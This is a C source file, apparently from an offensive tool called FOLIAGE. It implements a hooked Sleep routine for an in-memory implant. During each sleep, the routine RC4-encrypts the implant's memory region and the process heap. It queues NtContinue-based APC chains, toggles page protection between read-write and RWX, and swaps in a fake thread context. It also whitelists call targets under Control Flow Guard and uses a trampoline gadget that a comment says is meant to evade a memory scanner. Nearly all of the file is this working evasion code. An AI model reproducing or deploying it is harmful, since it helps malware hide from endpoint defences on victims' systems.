//
// https://github.com/SecIdiot/FOLIAGE
//


#include "hooks.h"

#define KEY_SIZE 16
#define KEY_VALS "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"


typedef struct {
    struct
    {
        D_API( LdrGetProcedureAddress );
        D_API( LdrLoadDll );
        D_API( LdrUnloadDll );
        D_API( NtAlertResumeThread );
        D_API( NtClose );
        D_API( NtContinue );
        D_API( NtCreateEvent );
        D_API( NtCreateThreadEx );
        D_API( NtGetContextThread );
        D_API( NtOpenThread );
        D_API( NtProtectVirtualMemory );
        D_API( NtQueryInformationProcess );
        D_API( NtQueueApcThread );
        D_API( NtSetContextThread );
        D_API( NtSignalAndWaitForSingleObject );
        D_API( NtTerminateThread );
        D_API( NtTestAlert );
        D_API( NtWaitForSingleObject );
        D_API( RtlAllocateHeap );
        D_API( RtlExitUserThread );
        D_API( RtlFreeHeap );
        D_API( RtlInitAnsiString );
        D_API( RtlInitUnicodeString );
        D_API( RtlRandomEx );
        D_API( RtlUserThreadStart );
        D_API( RtlWalkHeap );

    } ntdll;

    struct
    {
        D_API( SetProcessValidCallTargets );

    } kb;

    struct
    {
        D_API( WaitForSingleObjectEx );

    } k32;
    
    struct
    {
        D_API( SystemFunction032 );

    } advapi;

    HANDLE   hNtdll;
    HANDLE   hK32;
    HANDLE   hAdvapi;
    ULONG    szNtdll;

    PVOID    Buffer;
    ULONG    Length;
    NTSTATUS CFG;
    DWORD    dwMilliseconds;
    UCHAR    enckey[KEY_SIZE];

} API, *PAPI;


SECTION( D ) BOOL isCFGEnforced( PAPI pApi )
{
    EXTENDED_PROCESS_INFORMATION PrInfo = { 0 };

    if( pApi->ntdll.NtQueryInformationProcess && pApi->kb.SetProcessValidCallTargets )
    {
        PrInfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
        PrInfo.ExtendedProcessInfoBuffer = 0;

        if( pApi->ntdll.NtQueryInformationProcess( ( ( HANDLE )-1 ), ProcessCookie | ProcessUserModeIOPL, &PrInfo, sizeof( PrInfo ), NULL ) == STATUS_SUCCESS )
        {
            return TRUE;
        };
    };

    return FALSE;
};

SECTION( D ) NTSTATUS setValidCallTargets( PAPI pApi, HANDLE module, LPVOID funcPtr )
{
    NTSTATUS                Status = STATUS_SUCCESS;
    PIMAGE_DOS_HEADER       DosHdr = NULL;
    PIMAGE_NT_HEADERS       NtsHdr = NULL;
    SIZE_T                  Length = 0;           
    CFG_CALL_TARGET_INFO    CfInfo = { 0 };

    if( isCFGEnforced( pApi ) )
    {
        DosHdr = C_PTR( module );
        NtsHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
        Length = NtsHdr->OptionalHeader.SizeOfImage;
        Length = ( Length + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

        CfInfo.Flags  = CFG_CALL_TARGET_VALID;
        CfInfo.Offset = U_PTR( funcPtr ) - U_PTR( module );
        Status = pApi->kb.SetProcessValidCallTargets( ( ( HANDLE )-1 ), module, Length, 1, &CfInfo ) ? STATUS_SUCCESS : NtCurrentTeb()->LastErrorValue;
    };

    return Status;
};

SECTION( D ) VOID handleCFG( PAPI pApi )
{
    setValidCallTargets( pApi, pApi->hK32, C_PTR( pApi->k32.WaitForSingleObjectEx ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtContinue ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtGetContextThread ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtProtectVirtualMemory ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtSetContextThread ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtTestAlert ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtWaitForSingleObject ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.RtlExitUserThread ) );
};

SECTION( D ) NTSTATUS queueAPCs( PAPI pApi, PCONTEXT* contexts, HANDLE hThread )
{
    NTSTATUS Status;
    for( int i = 9; i >= 0; i-- )
    {
        Status = pApi->ntdll.NtQueueApcThread( hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
        if( Status != STATUS_SUCCESS )
        {
            break;
        };
    };

    return Status;
};

SECTION( D ) VOID initContexts( PAPI pApi, PCONTEXT* contexts )
{
    PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    for( int i = 13; i >= 0; i-- )
    {
        contexts[i] = ( PCONTEXT )C_PTR( SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, C_PTR( HEAP_ZERO_MEMORY ), C_PTR( sizeof( CONTEXT ) ) ) );
        if( i < 10 )
        {
            *contexts[i] = *contexts[11];
        };
        contexts[i]->ContextFlags = CONTEXT_FULL;
    };
}; 

SECTION( D ) VOID freeContexts( PAPI pApi, PCONTEXT* contexts )
{
    PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    for( int i = 0; i < 13; i++ )
    {
        if( contexts[i] )
        {
            SPOOF( pApi->ntdll.RtlFreeHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, 0, contexts[i] );
        };
    };
}; 

SECTION( D ) VOID startSleepChain( PAPI pApi, HANDLE hThread, HANDLE hEvent )
{
    ULONG outSuspendCount  = 0;

    if( pApi->ntdll.NtAlertResumeThread( hThread, &outSuspendCount ) == STATUS_SUCCESS )
    {
        pApi->ntdll.NtSignalAndWaitForSingleObject( hEvent, hThread, TRUE, NULL );
    };
};

SECTION( D ) VOID addCommonStackData( PAPI pApi, PCONTEXT* contexts )
{
    for( int i = 0; i < 10; i++ )
    {
        contexts[i]->Rsp = U_PTR( contexts[11]->Rsp - ( 0x1000 * ( i + 1 ) ) );
        *( ULONG_PTR * )( contexts[i]->Rsp + 0x00 ) = ( ULONG_PTR ) pApi->ntdll.NtTestAlert;
    };
};

SECTION( D ) NTSTATUS openOriginalThread( PAPI pApi, PHANDLE thread )
{
    NTSTATUS            Status  = STATUS_SUCCESS;
    CLIENT_ID           Cid     = { 0 };
    OBJECT_ATTRIBUTES   ObjAddr = { 0 };

    Cid.UniqueProcess = 0;
    Cid.UniqueThread = NtCurrentTeb()->ClientId.UniqueThread;
    ObjAddr.Length = sizeof( ObjAddr );
    
    Status = pApi->ntdll.NtOpenThread( thread, THREAD_ALL_ACCESS, &ObjAddr, &Cid );

    return Status;
};

SECTION( D ) NTSTATUS createSleepThread( PAPI pApi, PHANDLE thread )
{
    NTSTATUS Status = STATUS_SUCCESS;
    PVOID    StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
    SIZE_T   StackSize = 0x01FFFFFF;

    Status = pApi->ntdll.NtCreateThreadEx( thread, THREAD_ALL_ACCESS, NULL, ( HANDLE )-1, StartAddress, NULL, TRUE, 0, StackSize, StackSize, NULL );

    return Status;
};

SECTION( D ) NTSTATUS setupThreads( PAPI pApi, PHANDLE originalThd, PHANDLE sleepThd )
{    
    NTSTATUS Status = STATUS_SUCCESS;

    Status = openOriginalThread( pApi, originalThd );
    if( Status != STATUS_SUCCESS )
    {
        return Status;
    };

    Status = createSleepThread( pApi, sleepThd );

    return Status;
};

SECTION( D ) VOID delayExec( PAPI pApi )
{
    #define CHECKERR( status )  if( status != STATUS_SUCCESS ) { goto cleanup; };

    NTSTATUS    Status  = 0;
    HANDLE      SyncEvt = NULL;
    HANDLE      WaitThd = NULL;
    HANDLE      OrigThd = NULL;
    ULONG       OldProt = 0;
    PCONTEXT    Contexts[13]; // APC CTXs 0-9, Original CTX, Sleep CTX, Fake CTX
    UCHAR       EmptyStk[256];
    USTRING     S32Key;
    USTRING     S32Data;
    PVOID       Trampoline;

    RtlSecureZeroMemory( &Contexts, sizeof( Contexts ) );
    RtlSecureZeroMemory( &EmptyStk, sizeof( EmptyStk ) );
    
    handleCFG( pApi );

    S32Key.len = S32Key.maxlen = KEY_SIZE;
    S32Key.str = pApi->enckey;
    S32Data.len = S32Data.maxlen = pApi->Length;
    S32Data.str = ( PBYTE )( pApi->Buffer );

    Status = setupThreads( pApi, &OrigThd, &WaitThd );
    CHECKERR( Status );
    
    Status = pApi->ntdll.NtCreateEvent( &SyncEvt, EVENT_ALL_ACCESS, NULL, 1, FALSE );
    CHECKERR( Status );

    initContexts( pApi, Contexts );

    Status = pApi->ntdll.NtGetContextThread( WaitThd, Contexts[11] );
    CHECKERR( Status );

    addCommonStackData( pApi, Contexts );
    Trampoline = FindGadget( pApi->hNtdll, pApi->szNtdll );

    Contexts[12]->Rip = U_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
    Contexts[12]->Rsp = U_PTR( &EmptyStk );

    DWORD c = 9; 
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtWaitForSingleObject );
    Contexts[c]->Rcx = U_PTR( SyncEvt );
    Contexts[c]->Rdx = U_PTR( FALSE );
    Contexts[c]->R8  = U_PTR( NULL );
    
    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->Length );
    Contexts[c]->R9  = U_PTR( PAGE_READWRITE );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtGetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[10] ); // Original Context

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[12] ); // Fake Context

    c--;
    Contexts[c]->Rip = U_PTR( pApi->k32.WaitForSingleObjectEx );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( pApi->dwMilliseconds );
    Contexts[c]->R8 = U_PTR( FALSE );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[10] ); // Original Context

    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->Length );
    Contexts[c]->R9  = U_PTR( PAGE_EXECUTE_READWRITE );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.RtlExitUserThread );
    Contexts[c]->Rcx = U_PTR( NULL );
    
    Status = queueAPCs( pApi, Contexts, WaitThd );
    CHECKERR( Status );

    startSleepChain( pApi, WaitThd, SyncEvt );

cleanup:
    freeContexts( pApi, Contexts );
    
    if( WaitThd )
    {
        pApi->ntdll.NtTerminateThread( WaitThd, STATUS_SUCCESS );
        pApi->ntdll.NtClose( WaitThd );
    };
    
    if( OrigThd )
    {
        pApi->ntdll.NtClose( OrigThd );
    };
    
    if( SyncEvt )
    {
        pApi->ntdll.NtClose( SyncEvt );
    };

    RtlSecureZeroMemory( &S32Data, sizeof( S32Data ) );
    RtlSecureZeroMemory( &S32Key, sizeof( S32Key ) );
}; 

SECTION( D ) VOID encryptHeap( PAPI pApi )
{
    USTRING S32Key;
    USTRING S32Data;
    RTL_HEAP_WALK_ENTRY Entry;

    RtlSecureZeroMemory( &Entry, sizeof( Entry ) );
    S32Key.len = S32Key.maxlen = KEY_SIZE;
    S32Key.str = pApi->enckey;

    while ( NT_SUCCESS( pApi->ntdll.RtlWalkHeap( GetProcessHeap_Hook(), &Entry ) ) )
    {
        if( ( Entry.Flags & RTL_PROCESS_HEAP_ENTRY_BUSY ) != 0 )
        {
            S32Data.len = S32Data.maxlen = Entry.DataSize;
            S32Data.str = ( PBYTE )( Entry.DataAddress );
            pApi->advapi.SystemFunction032( &S32Data, &S32Key );
        };
    };

    RtlSecureZeroMemory( &S32Data, sizeof( S32Data ) );
    RtlSecureZeroMemory( &S32Key, sizeof( S32Key ) );
    RtlSecureZeroMemory( &Entry, sizeof( Entry ) );
};

SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
{
    PPEB                Peb;
    UNICODE_STRING      Uni;
    ANSI_STRING			Str;
    HANDLE              hKb;

    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Str, sizeof( Str ) );

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;

    pApi->hNtdll  = FindModule( H_LIB_NTDLL, Peb, &pApi->szNtdll );
    pApi->hAdvapi = FindModule( H_LIB_ADVAPI32, Peb, NULL );
    pApi->hK32    = FindModule( H_LIB_KERNEL32, Peb, NULL );
    hKb           = FindModule( H_LIB_KERNELBASE, Peb, NULL );

    if( !pApi->hNtdll || !pApi->hK32 || !hKb )
    {
        return -1;
    };

    pApi->ntdll.LdrGetProcedureAddress          = FindFunction( pApi->hNtdll, H_API_LDRGETPROCEDUREADDRESS );
    pApi->ntdll.LdrLoadDll                      = FindFunction( pApi->hNtdll, H_API_LDRLOADDLL );
    pApi->ntdll.LdrUnloadDll                    = FindFunction( pApi->hNtdll, H_API_LDRUNLOADDLL );
    pApi->ntdll.NtAlertResumeThread             = FindFunction( pApi->hNtdll, H_API_NTALERTRESUMETHREAD );
    pApi->ntdll.NtClose                         = FindFunction( pApi->hNtdll, H_API_NTCLOSE );
    pApi->ntdll.NtContinue                      = FindFunction( pApi->hNtdll, H_API_NTCONTINUE );
    pApi->ntdll.NtCreateEvent                   = FindFunction( pApi->hNtdll, H_API_NTCREATEEVENT );
    pApi->ntdll.NtCreateThreadEx                = FindFunction( pApi->hNtdll, H_API_NTCREATETHREADEX );
    pApi->ntdll.NtGetContextThread              = FindFunction( pApi->hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi->ntdll.NtOpenThread                    = FindFunction( pApi->hNtdll, H_API_NTOPENTHREAD );
    pApi->ntdll.NtProtectVirtualMemory          = FindFunction( pApi->hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
    pApi->ntdll.NtQueryInformationProcess       = FindFunction( pApi->hNtdll, H_API_NTQUERYINFORMATIONPROCESS );
    pApi->ntdll.NtQueueApcThread                = FindFunction( pApi->hNtdll, H_API_NTQUEUEAPCTHREAD );
    pApi->ntdll.NtSetContextThread              = FindFunction( pApi->hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi->ntdll.NtSignalAndWaitForSingleObject  = FindFunction( pApi->hNtdll, H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
    pApi->ntdll.NtTerminateThread               = FindFunction( pApi->hNtdll, H_API_NTTERMINATETHREAD );
    pApi->ntdll.NtTestAlert                     = FindFunction( pApi->hNtdll, H_API_NTTESTALERT );
    pApi->ntdll.NtWaitForSingleObject           = FindFunction( pApi->hNtdll, H_API_NTWAITFORSINGLEOBJECT );
    pApi->ntdll.RtlAllocateHeap                 = FindFunction( pApi->hNtdll, H_API_RTLALLOCATEHEAP );
    pApi->ntdll.RtlExitUserThread               = FindFunction( pApi->hNtdll, H_API_RTLEXITUSERTHREAD );
    pApi->ntdll.RtlFreeHeap                     = FindFunction( pApi->hNtdll, H_API_RTLFREEHEAP );
    pApi->ntdll.RtlInitAnsiString               = FindFunction( pApi->hNtdll, H_API_RTLINITANSISTRING );
    pApi->ntdll.RtlInitUnicodeString            = FindFunction( pApi->hNtdll, H_API_RTLINITUNICODESTRING );
    pApi->ntdll.RtlRandomEx                     = FindFunction( pApi->hNtdll, H_API_RTLRANDOMEX );
    pApi->ntdll.RtlUserThreadStart              = FindFunction( pApi->hNtdll, H_API_RTLUSERTHREADSTART );
    pApi->ntdll.RtlWalkHeap                     = FindFunction( pApi->hNtdll, H_API_RTLWALKHEAP );

    pApi->kb.SetProcessValidCallTargets         = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
    pApi->k32.WaitForSingleObjectEx             = FindFunction( pApi->hK32, H_API_WAITFORSINGLEOBJECTEX );

    if( !pApi->hAdvapi )
    {
        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"advapi32.dll" ) ) );
        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &pApi->hAdvapi );

        if( !pApi->hAdvapi )
        {
            return -1;
        };
    };
    
    pApi->ntdll.RtlInitAnsiString( &Str, C_PTR( OFFSET( "SystemFunction032" ) ) );
    pApi->ntdll.LdrGetProcedureAddress( pApi->hAdvapi, &Str, 0, ( PVOID* )&pApi->advapi.SystemFunction032 );
    
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Str, sizeof( Str ) );

    return STATUS_SUCCESS;
};

SECTION( D ) VOID generateEncryptionKey( PAPI pApi )
{
    ULONG Seed = 1337;
    for( int i = 0; i < KEY_SIZE; i++ )
    {
        Seed = pApi->ntdll.RtlRandomEx( &Seed );
        pApi->enckey[i] = ( char )KEY_VALS[Seed % 61];
    };
};

SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds ) 
{
    API Api;
    RtlSecureZeroMemory( &Api, sizeof( Api ) );

    Api.CFG            = 0;
    Api.dwMilliseconds = dwMilliseconds;
    Api.Buffer         = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
    Api.Length         = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );

    if( resolveSleepHookFunctions( &Api ) == STATUS_SUCCESS )
    {
        
        if( dwMilliseconds < 1000 )
        {
            // Don't waste cycles on the full chain for `sleep 0`
            Api.k32.WaitForSingleObjectEx( ( HANDLE )-1, dwMilliseconds, FALSE );
            return;
        };

        generateEncryptionKey( &Api );
        encryptHeap( &Api );
        delayExec( &Api );
        encryptHeap( &Api );
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
